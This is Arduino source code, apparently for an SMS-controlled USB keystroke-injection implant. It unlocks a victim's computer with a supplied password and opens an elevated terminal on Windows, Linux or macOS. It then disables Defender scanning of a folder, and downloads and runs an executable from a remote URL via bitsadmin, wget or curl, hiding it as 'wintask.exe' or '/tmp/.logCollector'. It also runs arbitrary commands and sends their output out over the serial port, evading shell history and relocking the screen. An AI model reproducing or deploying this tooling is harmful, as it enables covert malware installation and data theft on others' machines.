
#include <Keyboard.h>
#include "Payloads.h"
#include "globals.h"
#include "utils.h"


void unlockDownload(String SMS_text){
  String OS = getValue(SMS_text,SEPARATOR,1);
  OS.toLowerCase();
  String password = getValue(SMS_text,SEPARATOR,2);
  String url = getValue(SMS_text,SEPARATOR,3);
  // Unlock the computer to download and execute malware
  unlockComputer(password);
  
  // Download and execute the malware
  if(OS == "win"){
    //Open a terminal with UAC elevated if possible
    openTerminalWindows();
    downloadAndRunMalwareWindows(url);
    exitTerminalWindowsLinux();
    lockWindowsLinux();
  }
  else if(OS == "lnx"){
    openTerminalLinux();
    downloadAndRunMalwareLinux(url);
    exitTerminalWindowsLinux();
    lockWindowsLinux();
  }
  else if(OS == "osx"){
    openTerminalMacOs();
    downloadAndRunMalwareMacOs(url);
    exitTerminalMultiOs();
    lockMacOs();
  }
  else if(OS == "winlin"){
    //We don't know the OS but we suspect is windows or linux
    openTerminalWindowsLinux();
    // If it's not windows it will fail, but it would be logged in the history
    downloadAndRunMalwareWindows(url);
    downloadAndRunMalwareLinux(url);
    downloadAndRunMalwareMacOs(url);
    exitTerminalWindowsLinux();
    lockWindowsLinux();
  }
  else if(OS == "multi"){
    //We don't know the OS
    openTerminalMultiOs();
    //We try all the payloads
    downloadAndRunMalwareWindows(url);
    downloadAndRunMalwareLinux(url);
    downloadAndRunMalwareMacOs(url);
    //It also closes it for Windows and Linux
    exitTerminalMultiOs();
    //We try to lock all the os
    lockWindowsLinux();
    lockMacOs();
  }
  else {
    sendSMSMessage("Wrong OS sent for payload");
  }
}


void unlockRunAndExfil(String SMS_text) {
  String OS = getValue(SMS_text,SEPARATOR,1);
  OS.toLowerCase();
  String password = getValue(SMS_text,SEPARATOR,2);
  String command = getValue(SMS_text,SEPARATOR,3);
  // Unlock the computer to download and execute malware
  unlockComputer(password);
  
  // Download and execute the malware
  if(OS == "win"){
    //Open a terminal with UAC elevated if possible
    openTerminalWindows();
    runAndExfilWindows(command);
    exitTerminalWindowsLinux();
    lockWindowsLinux();
  }
  else if(OS == "lnx"){
    openTerminalLinux();
    runAndExfilLinux(command);
    exitTerminalWindowsLinux();
    lockWindowsLinux();
  }
  else if(OS == "osx"){
    openTerminalMacOs();
    runAndExfilMacOs(command);
    exitTerminalMultiOs();
    lockMacOs();
  }
  else if(OS == "winlin"){
    //We don't know the OS but we suspect is windows or linux
    openTerminalWindowsLinux();
    // If it's not windows it will fail, but it would be logged in the history
    runAndExfilWindows(command);
    runAndExfilLinux(command);
    runAndExfilMacOs(command);
    exitTerminalWindowsLinux();
    lockWindowsLinux();
  }
  else if(OS == "multi"){
    //We don't know the OS
    openTerminalMultiOs();
    //We try all the payloads
    runAndExfilWindows(command);
    runAndExfilLinux(command);
    runAndExfilMacOs(command);
    //It also closes it for Windows and Linux
    exitTerminalMultiOs();
    //We try to lock all the os
    lockWindowsLinux();
    lockMacOs();
  }
  else {
    sendSMSMessage("Wrong OS sent for payload");
  }
}

// Manuall##press##83 72 (in hex)
// Manual##delay##100
// Manual##release
void manualPayload(String SMS_text){
  String action = getValue(SMS_text,SEPARATOR,1);
  String argument = getValue(SMS_text,SEPARATOR,2);

  if (action == "press"){
    // There can be an unlimited number of keystrokes separated by space
    int n_spaces = 0;
    for(int i=0; i<=argument.length() ;i++){
      if(argument.charAt(i) == ' '){
          n_spaces++;
      }
    }
    for(int i=0; i<=n_spaces ;i++){
        String keystroke = getValue(argument," ",i);
        Keyboard.press((int)strtol(keystroke.c_str(), 0, 16));
    }
    Keyboard.releaseAll();
  }
  else if (action == "print"){
    Keyboard.print(argument.c_str());
  }
  else if (action == "release"){
    Keyboard.releaseAll();
  }
  else if (action == "delay"){
    delay(argument.toInt());
  }
}


/* Multiplatform - Press control twice just to be sure lockscreen picture is gone*/
void unlockComputer(String password){
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.releaseAll();
  //Some extra delay in case the compiuter is suspended
  delay(1000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print(password.c_str());
  delay(500);
  Keyboard.press('\n');
  Keyboard.releaseAll(); 
  // It could take some time to unlock
  delay(3000); 
}

// It opens a terminal in Windows (7, 8, 10) it tries to open an UAC elevated cmd.exe
void openTerminalWindows(){
  //Keys:
  // Windows+R
  //  cmd.exe
  // Enter
  //Actions:
  // Windows: Opens cmd
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("cmd.exe");
  Keyboard.press('\n');
  Keyboard.releaseAll();
  delay(2000);
  
  //Keys:
  // powershell Start-Process cmd -Verb runAs && exit
  // Enter
  // LEFT + y 
  // Backspace
  // Escape
  //Actions:
  // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
  // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
  Keyboard.print("powershell Start-Process cmd -Verb runAs && exit");
  Keyboard.press('\n');
  Keyboard.releaseAll();
  //Powershell needs time to load (at least in my very slow windows laptop)
  delay(5000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.press(KEY_BACKSPACE);
  Keyboard.releaseAll();
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  //It also needs time after the UAC fails
  delay(3000);
}


// It opens a terminal in Windows (7, 8, 10) and Linux (Ubuntu, 16, 18)
void openTerminalLinux(){
  //Keys:
  // Ctrl+Alt+T 
  //Actions:
  // Windows: Nothing
  // Linux: Open a terminal
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(3000);
  //Now we are ready to execute commands in Linux :)
}

// It opens a terminal in MacOS (Mojave)
void openTerminalMacOs(){
  //Keys:
  // Win+space
  // Win+d
  // backspace
  // Win+q
  // Esc
  // Win+space
  //Action:
  // MacOs: It opens the spotlight (and ignores Command+D a very common shortcut in MacOs)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1000);
  //Sometimes the spotlight has already some text, we delete it
  Keyboard.press(KEY_BACKSPACE);
  Keyboard.releaseAll();
  delay(1000);

  //Keys:
  // terminal.app
  // Enter
  //Actions:
  // MacOs: Open a terminal
  Keyboard.print("terminal.app");
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000);
}

// It opens a terminal in Windows (7, 8, 10) and Linux (Ubuntu, 16, 18)
void openTerminalWindowsLinux(){
  //Keys:
  // Win+D
  //Action:
  // Windows: It opens the desktop
  // Linux: It opens the desktop
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(1000);
  
  //Keys:
  // Ctrl+Alt+T 
  //Actions:
  // Windows: Nothing
  // Linux: Open a terminal
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(1000);
  
  //Keys:
  // space
  // Windows+R
  //  cmd.exe
  // Enter
  // LEFT + y 
  // Backspace
  //Actions:
  // Windows: Opens cmd
  // Linux: It writes rcmd.exe to the terminal and tries to run it (Not logged in the bash history)
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(500);  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print(" cmd.exe");
  Keyboard.press('\n');
  Keyboard.releaseAll();
  delay(2000);
  
  //Keys:
  //  powershell Start-Process cmd -Verb runAs && exit
  // Enter
  // LEFT + y 
  // Backspace
  // Escape
  //Actions:
  // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
  // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
  Keyboard.print(" powershell Start-Process cmd -Verb runAs && exit");
  Keyboard.press('\n');
  Keyboard.releaseAll();
  //Powershell needs time to load (at least in my very slow windows laptop)
  delay(5000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.press(KEY_BACKSPACE);
  Keyboard.releaseAll();
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(500);
  ///bin/bash ommits one character after you press ESC, so we press it again
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(2000);
}

// It opens a terminal in Windows (7, 8, 10), Linux (Ubuntu 16, 18) and MacOS (Mojave)
// It's a bit tricky and it could conflict with some custom shortcuts, so I recommends using the specific function if the OS is known.
void openTerminalMultiOs(){
  //Keys:
  // Win+space
  // Win+d
  // backspace
  // Win+q
  // Esc
  // Win+space
  //Action:
  // Window It opens the desktop
  // Linux: It opens the desktop
  // MacOs: It opens the spotlight (and ignores Command+D a very common shortcut in MacOs)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(1000);
  //Sometimes the spotlight has already some text, we delete it
  Keyboard.press(KEY_BACKSPACE);
  Keyboard.releaseAll();
  delay(1000);
  //Sometimes Win+D opens the dictionary from the spotlight in macos. We close it with this
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('q');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(1000);
  //We reopen the spotlight
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1000);

//This doesn't work all the times, it deselect the icon but an app in the task bar gets selected, and that's worst with the next commands
  //Keys:
  // Menu key (Shift + F10)
  // R
  // ESC
  //Actions:
  // Windows: Deselects the current item in the desktop
  // Linux: Nothing
  // MacOs: Nothing
//  Keyboard.press(KEY_LEFT_SHIFT);
//  Keyboard.press(KEY_F10);
//  Keyboard.releaseAll();
//  delay(500);
//  Keyboard.press('R');
//  Keyboard.releaseAll();
//  delay(500);
//  Keyboard.press(KEY_ESC);
//  Keyboard.releaseAll();
//  delay(500);

  //Keys:
  // terminal.app
  // Enter
  //Actions:
  // Windows: Nothing
  // Linux: It tries to execute that command but it fails
  // MacOs: Open a terminal
  Keyboard.print("terminal.app");
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  //Keys:
  // Ctrl+Alt+T 
  //Actions:
  // Windows: Nothing
  // Linux: Open a terminal
  // MacOs: Nothing (We are in the terminal)
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(1000);

  //Keys:
  // space
  // Windows+R
  //  cmd.exe
  // Enter
  //Actions:
  // Windows: Opens cmd
  // Linux: It writes rcmd.exe to the terminal and tries to run it (Not logged in the bash history)
  // MacOs: It writes cmd.exe to the terminal and tries to run it (Not logged in the bash history)
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(500);  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.print(" r");
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print(" cmd.exe");
  Keyboard.press('\n');
  Keyboard.releaseAll();
  delay(2000);
  
  //Keys:
  //  powershell Start-Process cmd -Verb runAs && exit
  // Enter
  // LEFT + y 
  // Backspace
  // Escape
  //Actions:
  // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
  // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
  // MacOs: It writes powershell... to the terminal and tries to run it (Not logged in the bash history)
  Keyboard.print(" powershell Start-Process cmd -Verb runAs && exit");
  Keyboard.press('\n');
  Keyboard.releaseAll();
  //Powershell needs time to load (at least in my very slow windows laptop)
  delay(4000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.press(KEY_BACKSPACE);
  Keyboard.releaseAll();
  ///bin/bash ommits one character after you press ESC, so we press it again
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(500);
  ///bin/bash ommits one character after you press ESC, so we press it again
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(2000);

  //Now we are ready to execute commands in all OS :)
}

void downloadAndRunMalwareWindows(String url){
  // Add windows defender exception
  Keyboard.println("powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%");
  Keyboard.releaseAll(); 
  delay(3000);

  Keyboard.print("bitsadmin /transfer winupdate /download /priority foreground ");
  Keyboard.print(url);
  Keyboard.println(" %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe");
  Keyboard.releaseAll();
  delay(2000);        
}

// By default ubuntu has wget but not curl
// Tested it in bash, zsh and fish shells
// disown is important for zsh, if not zsh doesn't exit after exit because of a pending job
void downloadAndRunMalwareLinux(String url){
  Keyboard.print(" export x=/tmp/.logCollector && wget --no-check-certificate ");
  Keyboard.print(url);
  Keyboard.println(" -O $x && chmod +x $x && nohup $x & disown");
  Keyboard.releaseAll();
  delay(1000);
}

// By default MacOs has curl but not wget
// Tested it in bash, zsh and fish shells
// disown is important for zsh, if not zsh doesn't exit after exit because of a pending job
void downloadAndRunMalwareMacOs(String url){
  Keyboard.print(" export x=/tmp/.logCollector && curl -k ");
  Keyboard.print(url);
  Keyboard.println(" -o $x && chmod +x $x && nohup $x & disown");
  Keyboard.releaseAll();
  delay(1000); 
}

void exitTerminalWindowsLinux(){
  //Keys:
  // exit
  //Actions:
  // Windows: Closes the terminal
  // Linux: Closes the terminal
  // MacOs: Closes the shell but the terminal remains open
  Keyboard.println(" exit");
  Keyboard.releaseAll();
  delay(1000);
}

void exitTerminalMultiOs(){
  exitTerminalWindowsLinux();

  //Only for MacOs
  //Keys:
  // Alt+Q
  // ESC
  //Actions:
  // Windows: Nothing (Open the search bar in win8 and closes it with ESC)
  // Linux: Nothing
  // MacOs: Closes the terminal window
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('q');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
}

void lockWindowsLinux(){
  Keyboard.press(KEY_RIGHT_GUI);
  Keyboard.press('l');
  Keyboard.releaseAll(); 
  delay(1000);
}

void lockMacOs(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('q');
  Keyboard.releaseAll();
  delay(1000);
}

//These strings use a lot of the memory so we use PROGMEM to store it in the code area
const char powershell_command_1[] PROGMEM = " powershell -Command \"$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace \\\"root\\CIMV2\\\" -Filter \\\"PNPDeviceID like 'USB\\\\VID_2341^&PID_8036%'\\\").Caption; $com=[regex]::match($s,'\\(([^\\)]+)\\)').Groups[1].Value; $cmd=";
const char powershell_command_2[] PROGMEM = "; $port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one; $port.open(); $port.WriteLine(\\\"$cmd\\\"); $port.Close();";

void runAndExfilWindows(String command) {
  Keyboard.print(powershell_command_1);
  // We avoid concatenation to avoid dynamic memory usage
  Keyboard.print(command);
  Keyboard.println(powershell_command_2);
  delay(3000);  
}

void runAndExfilLinux(String command) {
  Keyboard.print(" stty -F /dev/serial/by-id/*Arduino* 38400 && ");
  Keyboard.print(command);
  Keyboard.println(" > /dev/serial/by-id/*Arduino* ");
  delay(3000);  
}

void runAndExfilMacOs(String command) {
  Keyboard.print(" stty -f /dev/cu.usbmodem* 38400 && ");
  Keyboard.print(command);
  Keyboard.println(" > /dev/cu.usbmodem*");
  delay(3000);
}
